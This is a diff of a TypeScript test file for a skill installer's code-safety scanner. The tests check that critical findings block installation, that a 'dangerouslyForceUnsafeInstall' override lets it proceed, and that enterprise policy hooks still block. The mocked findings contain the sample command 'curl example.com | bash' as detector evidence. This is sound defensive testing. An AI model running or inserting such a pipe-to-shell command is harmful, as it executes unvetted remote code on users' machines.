@@ -86,7 +86,7 @@ describe("installSkill code safety scanning", () => {
     });
   });
 
-  it("adds detailed warnings for critical findings and continues install", async () => {
+  it("blocks install for critical findings without dangerous override", async () => {
     await withWorkspaceCase(async ({ workspaceDir }) => {
       const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
       scanDirectoryWithSummaryMock.mockResolvedValue({
@@ -112,11 +112,53 @@ describe("installSkill code safety scanning", () => {
         installId: "deps",
       });
 
-      expect(result.ok).toBe(true);
+      expect(result.ok).toBe(false);
+      expect(result.message).toContain("installation blocked by dangerous code patterns");
+      expect(result.message).toContain("dangerouslyForceUnsafeInstall");
       expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
         true,
       );
       expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
+      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
+    });
+  });
+
+  it("allows critical findings when dangerous override is set", async () => {
+    await withWorkspaceCase(async ({ workspaceDir }) => {
+      const skillDir = await writeInstallableSkill(workspaceDir, "forced-skill");
+      scanDirectoryWithSummaryMock.mockResolvedValue({
+        scannedFiles: 1,
+        critical: 1,
+        warn: 0,
+        info: 0,
+        findings: [
+          {
+            ruleId: "dangerous-exec",
+            severity: "critical",
+            file: path.join(skillDir, "runner.js"),
+            line: 1,
+            message: "Shell command execution detected (child_process)",
+            evidence: 'exec("curl example.com | bash")',
+          },
+        ],
+      });
+
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "forced-skill",
+        installId: "deps",
+        dangerouslyForceUnsafeInstall: true,
+      });
+
+      expect(result.ok).toBe(true);
+      expect(
+        result.warnings?.some((warning) =>
+          warning.includes(
+            "forced despite dangerous code patterns via dangerouslyForceUnsafeInstall",
+          ),
+        ),
+      ).toBe(true);
+      expect(runCommandWithTimeoutMock).toHaveBeenCalledTimes(1);
     });
   });
 
@@ -217,6 +259,45 @@ describe("installSkill code safety scanning", () => {
         workspaceDir,
         skillName: "blocked-skill",
         installId: "deps",
+      });
+
+      expect(result.ok).toBe(false);
+      expect(result.message).toBe("Blocked by enterprise policy");
+      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
+    });
+  });
+
+  it("keeps before_install blocks even with dangerous override", async () => {
+    const handler = vi.fn().mockReturnValue({
+      block: true,
+      blockReason: "Blocked by enterprise policy",
+    });
+    initializeGlobalHookRunner(createMockPluginRegistry([{ hookName: "before_install", handler }]));
+
+    await withWorkspaceCase(async ({ workspaceDir }) => {
+      const skillDir = await writeInstallableSkill(workspaceDir, "forced-but-blocked");
+      scanDirectoryWithSummaryMock.mockResolvedValue({
+        scannedFiles: 1,
+        critical: 1,
+        warn: 0,
+        info: 0,
+        findings: [
+          {
+            ruleId: "dangerous-exec",
+            severity: "critical",
+            file: path.join(skillDir, "runner.js"),
+            line: 1,
+            message: "Shell command execution detected (child_process)",
+            evidence: 'exec("curl example.com | bash")',
+          },
+        ],
+      });
+
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "forced-but-blocked",
+        installId: "deps",
+        dangerouslyForceUnsafeInstall: true,
       });
 
       expect(result.ok).toBe(false);
